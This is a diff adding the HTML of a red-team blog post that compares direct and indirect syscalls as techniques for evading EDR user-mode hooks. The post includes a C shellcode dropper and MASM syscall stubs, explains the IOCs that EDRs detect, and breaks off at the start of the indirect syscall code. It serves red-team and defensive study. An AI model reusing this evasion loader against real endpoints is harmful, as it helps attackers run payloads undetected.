@@ -1,0 +1,933 @@
+<html lang="en"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        
+
+
+<title>
+    Direct Syscalls vs Indirect Syscalls - RedOps - English
+</title>
+<meta name="referrer" content="origin-when-cross-origin">
+<meta name="description" content="">
+
+<meta property="fb:app_id" content="">
+<meta property="og:url" content="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Direct Syscalls vs Indirect Syscalls - RedOps">
+<meta property="og:image" content="https://redops.at/assets/images//transforms/blog/_1200x630_crop_center-center_none/iStock-1467868132.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:description" content="">
+<meta property="og:site_name" content="RedOps - English">
+<meta property="og:locale" content="en">
+<meta property="og:locale:alternate" content="de_AT">
+<meta property="og:locale:alternate" content="en">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="">
+<meta name="twitter:url" content="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls">
+<meta name="twitter:title" content="Direct Syscalls vs Indirect Syscalls - RedOps">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="https://redops.at/assets/images//transforms/blog/_1200x600_crop_center-center_none/iStock-1467868132.jpg">
+
+
+<link rel="home" href="https://redops.at/en/">
+<link rel="canonical" href="https://redops.at/en/en/blog/direct-syscalls-vs-indirect-syscalls">
+
+                                    <link rel="alternate" href="https://redops.at/blog/direct-syscalls-vs-indirect-syscalls" hreflang="de-AT" type="text/html">
+                    
+        <link rel="shortcut icon" type="image/x-icon" href="/favicon.svg">
+        <link rel="stylesheet" href="https://redops.at/dist/assets/css-CLotB-bN.css">
+
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" integrity="sha512-vswe+cgvic/XBoF1OcM/TeJ2FW0OofqAVdCZiEYkd6dwGXthvkSFWOoGGJgS2CW70VK5dQM5Oh+7ne47s74VTg==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+                    <script defer="" data-domain="redops.at" src="https://plausible.io/js/plausible.js"></script>
+            </head>
+    <body id="Main">
+        <header id="Header">
+            
+<div class="header dark">
+        <a href="https://redops.at/en/" class="title fade-in instant-on">Homepage</a>
+    <div class="language-switcher">
+                                                                                                                                    <a href="https://redops.at/blog/direct-syscalls-vs-indirect-syscalls" class="language-link ">DE</a>
+                                            <div class="language-divider  active">/</div>
+                                                                                                                                        <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" class="language-link active">EN</a>
+            </div>    <button type="button" class="nav-toggle close">
+        Navigation Menu
+        <div class="top-line"></div>
+        <div class="bottom-line"></div>
+    </button>
+</div>
+<nav class="nav">
+    <div class="nav-content container">
+        <ul class="nav-list">
+            <li class="nav-item">
+                <a href="https://redops.at/en/" class="nav-link glitch" data-content="Home">
+                    Home
+                </a>
+            </li>
+                                        <li class="nav-item">
+                    <a href="https://redops.at/en/about-us" class="nav-link glitch" data-content="About Us">
+                        About Us
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/knowledge-base" class="nav-link glitch" data-content="Knowledge Base">
+                        Knowledge Base
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/kontakt" class="nav-link glitch" data-content="Contact">
+                        Contact
+                    </a>
+                </li>
+                                </ul>
+        <ul class="nav-list expertise">
+                                        <li class="nav-item">
+                    <a href="https://redops.at/en/expertise" class="nav-link glitch" data-content="Services">
+                        Services
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/penetration-testing" class="nav-link glitch small" data-content="Penetration Test">
+                        Penetration Test
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/assumed-breach" class="nav-link glitch small" data-content="Assumed Breach">
+                        Assumed Breach
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/red-team-engagement" class="nav-link glitch small" data-content="Red Teaming">
+                        Red Teaming
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/training" class="nav-link glitch small" data-content="Workshops">
+                        Workshops
+                    </a>
+                </li>
+                    </ul>
+        <div class="contact">
+            <div class="heading">
+                Contact
+            </div>
+            <div class="address">
+                Föhrenweg 5, A-6065 Thaur
+            </div>
+            <a href="tel:+43-660-4765788" class="phone" data-plausible-event="click:phone">
+                +43 660 4765788
+            </a>
+            <a href="mailto:office@redops.at" class="email" data-plausible-event="click:email" data-plausible-props="navigation">
+                office@redops.at
+            </a>
+        </div>
+    </div>
+</nav>
+        </header>
+        <main>
+                    <div class="blog-page">
+        <div class="page-intro">
+            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
+            <div class="content container">
+                <h1 class="h1">
+                    Direct Syscalls vs Indirect Syscalls
+                </h1>
+                <div class="blog-text-section">
+                    <p><strong>tl;dr&nbsp;</strong>Direct syscalls are a technique that has become and is still frequently used by attackers and also Red Teamers for various activities such as executing shellcode or creating a memory dump from lsass.exe. However, depending on the EDR, Direct syscalls may no longer be sufficient at this point in time (May 2023) to evade EDRs in the context of various attack phases such as initial access, credential dumping, lateral movement etc. The reason for this is that more and more EDR vendors are implementing mechanisms in their products, such as kernel callbacks, which can be used to determine the memory area from which the syscall statement and the return statement are executed or to which memory area the return statement points. For example, if the return statement is executed outside the memory area of the ntdll.dll, this is abnormal behaviour under Windows and a clear Indicator of Compromise (IOC).<br><br>To eliminate this IOC from an attacker's (red team's) point of view, or to avoid detection by the EDR, direct syscalls can be replaced by indirect syscalls. In essence, indirect syscalls can be seen as a practical and logical evolution of direct syscalls. Specifically, they allow critical operations such as the syscall statement and the return statement to be executed in the memory of ntdll.dll, rather than in the memory of the .exe being used for execution, as part of an indirect syscall proof of concept (POC). This approach is more in line with standard operating behaviour seen in Windows environments, and is therefore a more sophisticated technique in terms of system compliance.</p>
+                </div>
+                                                <ul class="tags">
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=Malware Development" data-content="Malware Development">
+                                Malware Development
+                            </a>
+                        </li>
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=EDR Evasion" data-content="EDR Evasion">
+                                EDR Evasion
+                            </a>
+                        </li>
+                                    </ul>
+            </div>
+            <div class="share">
+                <div class="share-button">
+    Share
+    <div class="buttons">
+        <a class="social-button twitter" href="https://twitter.com/intent/tweet?text=https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank" data-plausible-event="click:share" data-plausible-props="twitter">
+            Tweet
+        </a>
+        <a class="social-button linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fredops.at%2Fen%2Fblog%2Fdirect-syscalls-vs-indirect-syscalls" target="_blank" data-plausible-event="click:share" data-plausible-props="linkedin">
+            Post on LinkedIn
+        </a>
+        <a class="social-button facebook" href="https://www.facebook.com/sharer.php?u=https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank" data-plausible-event="click:share" data-plausible-props="facebook">
+            Share on Facebook
+        </a>
+        <a class="social-button reddit" href="https://reddit.com/submit?url=https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls&amp;title=Direct Syscalls vs Indirect Syscalls" target="_blank" data-plausible-event="click:share" data-plausible-props="reddit">
+            Share on Reddit
+        </a>
+    </div>
+</div>
+            </div>
+        </div>
+        <div class="blog-content">
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Introduction</h3>
+<p>I have already written the blog post "<strong><a href="https://redops.at/blog/direct-syscalls-a-journey-from-high-to-low" target="_blank" rel="noreferrer noopener">Direct syscalls: A journey from high to low</a></strong>" on the topic of direct syscalls, but now I would like to take a closer look at indirect syscalls. In this blog post I want to explain the difference between direct syscalls and indirect syscalls. To do this, I will cover the following points throughout the article:</p>
+<ul><li>User Mode API-Hooking&nbsp;</li></ul>
+<p></p>
+<ul><li>Direct syscalls</li></ul>
+<p></p>
+<ul><li>Indirect syscalls&nbsp;</li></ul>
+<p></p>
+<p>The goal of this article is to rewrite a direct syscall dropper into an indirect syscall dropper, analyse both droppers with x64dbg, and understand the difference between direct syscalls and indirect syscalls. Also, at the end of the article, I will talk a bit about the limitations of indirect syscalls in the context of EDR evasion.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Disclaimer<br></h3>
+<p>The content and all code examples in this article are for research purposes only and must not be used in an unethical context! The code used is not new and I make no claim to it. The basis for the code comes, as so often, from the <strong><a href="https://www.ired.team/" target="_blank" rel="noreferrer noopener">ired.team</a></strong>, thank you <a href="https://twitter.com/spotheplanet" target="_blank" rel="noreferrer noopener"><strong>@spotheplanet</strong></a> for your brilliant work and sharing it with us all!</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>User mode API-Hooking</h3>
+<p>User mode API hooking gives EDRs the ability to dynamically inspect code executed in the context of Windows APIs or Native APIs for potentially malicious content or behaviour. There are basically different types of hooking, with most vendors using the inline hooking variant by replacing a specific mov instruction or, more specifically, by replacing the <code>mov</code>&nbsp;opcode and the <code>eax SSN</code> operands with a <code>5-byte jmp</code> instruction. Specific because it replaces the mov instruction, which is normally responsible for moving the syscall number or system service number (SSN) to the eax register. The unconditional jump instruction (jmp) causes a redirection to the EDR's hooking.dll, and the EDR can examine the code executed in the context of the Native API for potentially malicious content.<br><br>A return to the memory of <code>ntdll.dll</code>, and thus the execution of the syscall statement to initiate the transition from Windows user mode to kernel mode, only occurs if the EDR has determined that the code executed in the context of the respective Native API is not malicious. Otherwise, the syscall statement and the code in the context will not be executed. The following diagram shows a simplified illustration of how user mode API hooking works with EDR.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-size:16px;font-style:normal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;background-color:rgb(251,252,254);"><img src="https://redops.at/assets/images/blog/user-mode-hooking.png" alt=""></figure>
+<p></p>
+<p>If you want to check your own EDR to see if it or which (Native) APIs are redirected to the EDR's own hooking.dll, you can use a debugger such as <strong><a href="https://apps.microsoft.com/store/detail/windbg-preview/9PGJGD53TN86?hl=de-at&amp;gl=at&amp;rtc=1" target="_blank" rel="noreferrer noopener">WinDbg</a></strong>. To do this, start a program such as notepad on the endpoint with the EDR installed, then connect to the running process via Windbg. Note that if you make the same mistake as I did at the beginning and load notepad.exe directly as an image into the debugger, you will not find any hooks in the APIs, because in this case the EDR has not yet been able to inject its hooking.dll into the address space of notepad.exe.<br><br>The following command extracts the memory address of the desired API, in this case the address of the native API NtAllocateVirtualMemory, which is located in ntdll.dll.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">x ntdll<span class="token operator">!</span>NtAllocateVirtualMemory</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The memory address can then be resolved in the next step with the following command and you will get the content of the Native API function <code>NtAllocateVirtualMemory</code> in assembly format.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">u 00007ff8`16c4d3b0</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The upper part of the following figure shows the stub of the native function NtAllocateVirtualMemory on an endpoint with EDR installed, using the user mode API hooking technique. It can be seen that "mov eax SSN" has been replaced by a <code>5-byte</code> unconditional jump instruction (jmp). This jump instruction causes the code executed in the context of <code>NtAllocateVirtualMemory</code> to be redirected to the EDR's hooking.dll. The return to <code>ntdll.dll</code> memory and subsequent execution of the <code>syscall</code> will only occur if the EDR has determined that the code executed is not harmful, otherwise the EDR will abort.</p>
+<p>In comparison, the lower pane shows an unmodified stub of the native <code>NtAllocateVirtualMemory</code> function on an endpoint with no EDR installed. In other words, this is what an unmodified stub of a native function in ntdll.dll normally looks like on Windows.<br></p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/windgb_comparison.png" alt=""></figure>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Direct Syscalls<br></h3>
+<p>One way to evade the EDR user mode hooks is the technique of direct system calls. In simplified terms, this works as follows. Instead of obtaining the required code in the context of the Native APIs for the transition from Windows user mode to kernel mode via the <code>ntdll.dll</code>, the required content (stub) of the native function is implemented directly in the assembly in the form of assembly instructions. From an attacker's (red team's) point of view, this prevents code executed in the context of native APIs - which are provided with a hook - from being redirected to the EDR's hooking.dll and analysed by the EDR. The following figure shows the principle of direct syscalls in a simplified way.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/direct_syscalls_principle_2023-05-24-115444_nanc.png" alt=""></figure>
+<p>There are several tools and POCs available to implement and execute direct syscalls, such as <a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="noreferrer noopener">Syswhispers2</a>, <a href="https://github.com/klezVirus/SysWhispers3" target="_blank" rel="noreferrer noopener">Syswhispers3</a>, <a href="https://github.com/am0nsec/HellsGate" target="_blank" rel="noreferrer noopener">Hells Gate</a> or <a href="https://blog.sektor7.net/#!res/2021/halosgate.md" target="_blank" rel="noreferrer noopener">Halo's Gate</a>. In our case, we do not use any of these POCs, try to keep the code as simple as possible and use the following C code for our <strong>d</strong><strong>irect syscall POC</strong> for the practical part, which will be rewritten to an indirect syscall POC later in the indirect syscalls chapter. The code can also be downloaded as a <a href="https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls" target="_blank" rel="noreferrer noopener"><strong>Github</strong></a> repository in the form of a Visual Studio project.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">#include &lt;windows.h&gt;  
+#include &lt;stdio.h&gt;    
+#include "syscalls.h" 
+
+// Declare global variables to hold syscall numbers
+DWORD wNtAllocateVirtualMemory;
+DWORD wNtWriteVirtualMemory;
+DWORD wNtCreateThreadEx;
+DWORD wNtWaitForSingleObject;
+
+int main() {
+    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
+    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)
+
+    // Get a handle to the ntdll.dll library
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
+    // This is typically located at the 4th byte of the function
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
+
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
+
+
+    // Replace this with your actual shellcode
+    unsigned char shellcode[] = "\xfc\x48\x83...";
+
+
+    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&amp;allocBuffer, (ULONG_PTR)0, &amp;buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &amp;bytesWritten);
+
+    HANDLE hThread;
+    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module    
+UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
+    // This is typically located at the 5th byte of the function
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As the syscall numbers or system service numbers (SSN) can vary from Windows to Windows and also from version to version, we do not want to hardcode them into our C code, but rather read them dynamically by accessing the already loaded ntdll.dll in the address space of the assembly using the handle <code>hNtdll</code>. Why are <code>4-bytes</code> added to the <strong>base address</strong> of <code>NtAllocateVirtualMemory</code>? This is the necessary <strong>offset</strong> (relative to the Native API base address) to obtain the memory address of <code>mov eax SSN</code> that contains the SSN for the syscall. This allows the SSN to be read and then stored in the <code>wNtAllocateVirtualMemory</code> variable. The same principle is used for the other three SSNs of the Native APIs <code>NtWriteVirtualMemory</code>, <code>NtCreateThreadEx</code> and <code>NtWairForSingleObject</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&amp;allocBuffer, (ULONG_PTR)0, &amp;buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &amp;bytesWritten);
+
+    HANDLE hThread;
+    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
+    NtWaitForSingleObject(hThread, FALSE, NULL);</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As always, I'm a fan of understanding simple code and then modifying it step by step. As in my other posts, we use the Native API <code>NtAllocateVirtualMemory</code> to allocate memory, <code>NtWriteVirtualMemory</code> to write the shellcode to the allocated memory, <code>NtCreateThreadEx</code> to execute the shellcode in a new thread, and <code>NtWaitForSingleObject</code> to ensure that the main thread waits until the current thread executing the shellcode is finished. As mentioned at the beginning, when using direct syscalls, the code (stub) of the respective native function, which would otherwise be obtained via ntdll.dll, is implemented directly into the assembly via an .asm file.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The MASM assembler code in Intel syntax looks like this.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token directive property">EXTERN</span> wNtAllocateVirtualMemory:DWORD               <span class="token comment">; Extern keyword indicates that the symbol is defined in another module. Here it's the syscall number for NtAllocateVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> wNtWriteVirtualMemory:DWORD                  <span class="token comment">; Syscall number for NtWriteVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> wNtCreateThreadEx:DWORD                      <span class="token comment">; Syscall number for NtCreateThreadEx.</span>
+<span class="token directive property">EXTERN</span> wNtWaitForSingleObject:DWORD                 <span class="token comment">; Syscall number for NtWaitForSingleObject.</span>
+
+
+.<span class="token directive property">CODE</span>  <span class="token comment">; Start the code section</span>
+
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                                    <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> wNtAllocateVirtualMemory               <span class="token comment">; Move the syscall number into the eax register.</span>
+    syscall                                         <span class="token comment">; Execute syscall.</span>
+    ret                                             <span class="token comment">; Return from the procedure.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>                        <span class="token comment">; End of the procedure.</span>
+
+<span class="token comment">; Similar procedures for NtWriteVirtualMemory syscalls</span>
+NtWriteVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtWriteVirtualMemory
+    syscall
+    ret
+NtWriteVirtualMemory <span class="token directive property">ENDP</span>
+
+<span class="token comment">; Similar procedures for NtCreateThreadEx syscalls</span>
+NtCreateThreadEx <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtCreateThreadEx
+    syscall
+    ret
+NtCreateThreadEx <span class="token directive property">ENDP</span>
+
+<span class="token comment">; Similar procedures for NtWaitForSingleObject syscalls</span>
+NtWaitForSingleObject <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtWaitForSingleObject
+    syscall
+    ret
+NtWaitForSingleObject <span class="token directive property">ENDP</span>
+
+<span class="token directive property">END</span>  <span class="token comment">; End of the module</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token directive property">EXTERN</span> wNtAllocateVirtualMemory:DWORD               <span class="token comment">; Extern keyword indicates that the symbol is defined in another module. Here it's the syscall number for NtAllocateVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> wNtWriteVirtualMemory:DWORD                  <span class="token comment">; Syscall number for NtWriteVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> wNtCreateThreadEx:DWORD                      <span class="token comment">; Syscall number for NtCreateThreadEx.</span>
+<span class="token directive property">EXTERN</span> wNtWaitForSingleObject:DWORD                 <span class="token comment">; Syscall number for NtWaitForSingleObject.</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The <strong>EXTERN</strong> keyword can be used to access the variables <code>wNtAllocateVirtualMemory</code>, <code>wNtWriteVirtualMemory</code> etc. that were previously declared as global in the C code and that contain the respective SSN. This avoids having to hardcode the SSN into the assembly code.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                                    <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> wNtAllocateVirtualMemory               <span class="token comment">; Move the syscall number into the eax register.</span>
+    syscall                                         <span class="token comment">; Execute syscall.</span>
+    ret                                             <span class="token comment">; Return from the procedure.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>                        <span class="token comment">; End of the procedure.</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As mentioned above, in the context of the four native APIs used, we avoid accessing the ntdll.dll and implement the necessary code (stub) of the respective native function as assembly code in the .asm file. The assembly code performs the following tasks. First, the current content of register rcx is written to register r10 using <code>mov r10 rcx</code>. Then the current content of the variable wNtAllocateVirtualMemory is moved to the register eax using <code>mov eax wNtAllocateVirtualMemory</code>. Reminder: At this point, the globally declared variable <code>wNtAllocateVirtualMemory</code> contains the SSN of the <code>syscall</code> to the Native API <code>NtAllocateVirtualMemory</code>. Then the syscall is executed using the syscall statement <code>syscall</code> and at the end the return statement is executed using <code>ret</code>. The same procedure is used for the other native APIs (NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject).</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <figure class="image-center"><img src="https://redops.at/assets/images/blog/x64dbg_direct_syscalls.png" alt=""></figure><p><br>The compiled direct syscall POC is then loaded into x64dbg and analysed in more detail. Despite the fact that direct syscalls allow us to bypass user mode hooks via EDRs, direct syscalls result in the following IOCs, which can lead to detections depending on the EDR. </p>
+<ul><li>The execution of the syscall instruction takes place directly in the memory area of the direct syscall assembly and therefore outside the memory area of the ntdll.dll. This is a unique IOC, as syscall instructions are normally never executed outside the memory area of ntdll.dll. </li></ul><p></p>
+<ul><li>Furthermore, the execution of the return instruction takes place within the memory of the direct syscall assembly and simultaneously references from the memory area of the direct syscall assembly to the memory area of the direct syscall assembly. </li></ul><p></p>
+<p>In both cases, these are non-legitimate behaviours on Windows and therefore unique IOCs that can be used by EDRs to detect malicious behaviour through the use of kernel callbacks. For this reason, the indirect syscalls technique is covered in the next chapter.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Indirect Syscalls</h3>
+<p>The indirect syscall technique is more or less an evolution of the direct syscall technique. Compared to direct syscalls, indirect syscalls can solve the following EDR evasion problems&nbsp;</p>
+<ul><li>Firstly, the execution of the syscall command takes place within the memory of the ntdll.dll and is therefore legitimate for the EDR.&nbsp;</li></ul>
+<p></p>
+<ul><li>On the other hand, the execution of the return statement takes place within the memory of the ntdll.dll and points from the memory of the ntdll.dll to the memory of the indirect syscall assembly.</li></ul>
+<p></p>
+<p>As we will see later, compared to the direct syscall POC, simplified, only a part of the stub from the Native API&nbsp;is implemented and executed directly in the indirect syscall assembly itself, while the syscall statement and return are executed in the ntdll.dll memory. More on this later. The following diagram should help you to understand the concept of indirect syscalls, bearing in mind that it is a simplified representation.</p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/indirect_syscalls_principle_2023-05-24-115519_fkdn.png" alt=""></figure>
+<p>As a basis for the indirect syscall POC we will use the code from the direct syscall POC and you will see that the changes are very limited. The code looks like this and can be downloaded as a Visual Studio project from my <strong><a href="https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls" target="_blank" rel="noreferrer noopener">Github</a></strong> account.&nbsp;</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">#include &lt;windows.h&gt;  
+#include &lt;stdio.h&gt;    
+#include "syscalls.h"
+
